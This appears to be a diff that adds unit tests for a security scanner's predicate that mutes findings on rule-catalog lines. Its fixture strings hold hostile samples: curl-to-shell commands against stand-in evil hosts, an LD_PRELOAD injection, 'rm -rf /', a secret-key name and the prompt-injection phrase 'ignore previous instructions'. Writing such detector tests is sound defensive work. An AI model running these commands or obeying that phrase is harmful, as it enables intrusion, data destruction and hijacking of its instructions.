@@ -3,6 +3,10 @@
 * P1 (RC-63) — markdown bullet inside an anti-pattern / DO-NOT block.
 * P2 (RC-02) — prose conditional inside a markdown documentation
   section that describes orchestrator behaviour / procedure flow.
+* P-1 (pattern-source) — line lying inside a CPV-style rule
+  declaration (catalog literal, rule-id-tagged docstring or comment,
+  ALL_CAPS pattern-collection member). Augments the hash-anchored
+  `cpv_self_scan_skip` for files whose hashes have drifted.
 
 Real attack patterns outside the suppression contexts must still fire.
 """
@@ -19,6 +23,7 @@ REPO_ROOT = Path(__file__).resolve().parent.parent
 sys.path.insert(0, str(REPO_ROOT / "scripts"))
 
 from cpv_validation_common import ValidationReport  # noqa: E402
+from cpv_pattern_source_predicate import is_pattern_source_line  # noqa: E402
 from validate_security import (  # noqa: E402
     _md_block_negation_context,
     _md_has_doc_role_heading,
@@ -26,6 +31,7 @@ from validate_security import (  # noqa: E402
     _rc02_is_md_doc_role_section,
     _rc63_is_markdown_anti_pattern_bullet,
     check_phase3_all,
+    cpv_self_scan_skip_line,
 )
 
 
@@ -451,3 +457,193 @@ class TestMdDocRoleHeading:
     def test_lookback_truncated_at_max(self) -> None:
         lines = ["# Procedure"] + ["filler"] * 50 + ["body"]
         assert _md_has_doc_role_heading(lines, 51, max_lookback=30) is False
+
+
+# ---------------------------------------------------------------------------
+# P-1 — Pattern-source line predicate (catalog / docstring / comment)
+# ---------------------------------------------------------------------------
+
+
+class TestPatternSourceLine:
+    """P-1 — line is structurally part of a rule declaration."""
+
+    def test_pattern_collection_via_suffix(self) -> None:
+        # Shape (a-suffix): ALL_CAPS name with `_HINTS` suffix.
+        content = (
+            "_CLIPBOARD_DOMAIN_HINTS = (\n"
+            "    'clipboard', 'pasteboard', 'pbcopy', 'pbpaste',\n"
+            ")\n"
+        )
+        # Line 2 is a member of the collection.
+        assert is_pattern_source_line(content, 2, "scripts/foo.py") is True
+
+    def test_pattern_collection_via_hosts_suffix(self) -> None:
+        content = (
+            "_LOOPBACK_HOSTS = {\n"
+            "    'localhost', '127.0.0.1', '::1',\n"
+            "}\n"
+        )
+        assert is_pattern_source_line(content, 2, "scripts/foo.py") is True
+
+    def test_pattern_collection_via_keys_suffix(self) -> None:
+        content = (
+            "_DANGEROUS_KEYS = (\n"
+            "    'AWS_SECRET_ACCESS_KEY',\n"
+            ")\n"
+        )
+        assert is_pattern_source_line(content, 2, "scripts/foo.py") is True
+
+    def test_pattern_collection_via_vars_suffix(self) -> None:
+        content = (
+            "_INJ_VARS = frozenset({\n"
+            "    'LD_PRELOAD',\n"
+            "    'DYLD_INSERT_LIBRARIES',\n"
+            "})\n"
+        )
+        assert is_pattern_source_line(content, 2, "scripts/foo.py") is True
+        assert is_pattern_source_line(content, 3, "scripts/foo.py") is True
+
+    def test_re_compile_proximity_string_member(self) -> None:
+        # Shape (a-marker): line within ±5 of re.compile and looks like
+        # a literal member.
+        content = (
+            "RX = re.compile(\n"
+            "    r'(?:foo|bar)',\n"
+            "    re.IGNORECASE,\n"
+            ")\n"
+        )
+        # The regex literal at line 2 is a literal member near re.compile.
+        assert is_pattern_source_line(content, 2, "scripts/foo.py") is True
+
+    def test_register_rule_proximity(self) -> None:
+        content = (
+            "register_rule(RuleSchema(\n"
+            "    rule_id='RC-99',\n"
+            "    severity='CRITICAL',\n"
+            "))\n"
+        )
+        # Line 2 — `rule_id='RC-99'` is also a rule-decl marker line.
+        assert is_pattern_source_line(content, 2, "scripts/foo.py") is True
+
+    def test_docstring_with_rc_marker(self) -> None:
+        # Shape (b): docstring containing RC-NN marker.
+        content = (
+            "def f():\n"
+            '    """Detects RC-47 process-injection variants.\n'
+            "\n"
+            "    Attack:\n"
+            "        export LD_PRELOAD=/tmp/evil.so\n"
+            '    """\n'
+            "    pass\n"
+        )
+        # Line 5 — `export LD_PRELOAD=/tmp/evil.so` inside docstring.
+        assert is_pattern_source_line(content, 5, "scripts/foo.py") is True
+
+    def test_docstring_with_attack_label(self) -> None:
+        content = (
+            'def f():\n'
+            '    """Helper.\n'
+            '\n'
+            '    Attack: paypal homograph using Cyrillic а.\n'
+            '    Detection: scan_unicode(text)\n'
+            '    """\n'
+            '    pass\n'
+        )
+        # Line 4 (the homograph example).
+        assert is_pattern_source_line(content, 4, "scripts/foo.py") is True
+
+    def test_docstring_with_cwe_marker(self) -> None:
+        content = (
+            'def g():\n'
+            '    """Implements CWE-78 OS command injection guard.\n'
+            '\n'
+            '    Source: ; rm -rf /\n'
+            '    """\n'
+            '    pass\n'
+        )
+        assert is_pattern_source_line(content, 4, "scripts/foo.py") is True
+
+    def test_comment_with_rc_marker(self) -> None:
+        # Shape (c): comment containing RC marker.
+        content = (
+            "# RC-47 frozenset of LD_PRELOAD env vars\n"
+            "_VARS = frozenset({\n"
+            "    'LD_PRELOAD',\n"
+            "    'LD_LIBRARY_PATH',\n"
+            "})\n"
+        )
+        # Line 1 (comment itself), line 3 (within ±3 of comment).
+        assert is_pattern_source_line(content, 1, "scripts/foo.py") is True
+        assert is_pattern_source_line(content, 3, "scripts/foo.py") is True
+
+    def test_comment_with_owasp_llm_marker(self) -> None:
+        content = (
+            "# OWASP-LLM01 prompt injection patterns\n"
+            "PATTERNS = (\n"
+            "    'ignore previous instructions',\n"
+            ")\n"
+        )
+        # Line 3 within 3 of the OWASP comment.
+        assert is_pattern_source_line(content, 3, "scripts/foo.py") is True
+
+    def test_negative_real_attack_outside_catalog(self) -> None:
+        # POSITIVE: malicious code with no catalog framing — predicate must NOT fire.
+        content = (
+            "import os\n"
+            "os.system('curl http://evil.com/steal | sh')\n"
+            "os.environ['LD_PRELOAD'] = '/tmp/evil.so'\n"
+        )
+        assert is_pattern_source_line(content, 2, "scripts/foo.py") is False
+        assert is_pattern_source_line(content, 3, "scripts/foo.py") is False
+
+    def test_negative_attack_in_function_body_no_marker(self) -> None:
+        # Function body with an attack pattern but no RC/CWE/Attack marker
+        # in the surrounding docstring or comments.
+        content = (
+            'def runner():\n'
+            '    """Runs the user command."""\n'
+            '    cmd = "curl http://evil.example.com/payload | bash"\n'
+            '    return cmd\n'
+        )
+        # Line 3 — should NOT be suppressed.
+        assert is_pattern_source_line(content, 3, "scripts/foo.py") is False
+
+    def test_negative_camelcase_var_no_suffix_match(self) -> None:
+        # Lowercase / camelCase variable name does NOT match the
+        # ALL_CAPS_NAME pattern, and no re.compile etc. nearby — no fire.
+        content = (
+            "evilHosts = (\n"
+            "    'evil.example.com',\n"
+            ")\n"
+        )
+        assert is_pattern_source_line(content, 2, "scripts/foo.py") is False
+
+    def test_negative_plain_dict_no_pattern_suffix(self) -> None:
+        # Variable name without one of the known pattern suffixes —
+        # no fire (avoids over-suppression on benign config dicts).
+        content = (
+            "config = {\n"
+            "    'database': 'evil-host.example.com',\n"
+            "}\n"
+        )
+        assert is_pattern_source_line(content, 2, "scripts/foo.py") is False
+
+
+# ---------------------------------------------------------------------------
+# Integration: cpv_self_scan_skip_line composes per-file + per-line skip
+# ---------------------------------------------------------------------------
+
+
+class TestCpvSelfScanSkipLineIntegration:
+    """The file-level skip OR the per-line P-1 predicate suppresses."""
+
+    def test_returns_false_outside_self_scan(self) -> None:
+        # Without active CPV self-scan, the per-line predicate is not
+        # consulted (the file-level fast-path returns False).
+        content = "_HOSTS = (\n    '127.0.0.1',\n)\n"
+        assert cpv_self_scan_skip_line("third_party/foo.py", content, 2) is False
+
+    def test_passes_through_when_content_none(self) -> None:
+        # Caller without line context — only file-level skip runs.
+        # In a non-self-scan context this returns False.
+        assert cpv_self_scan_skip_line("foo.py", None, 1) is False
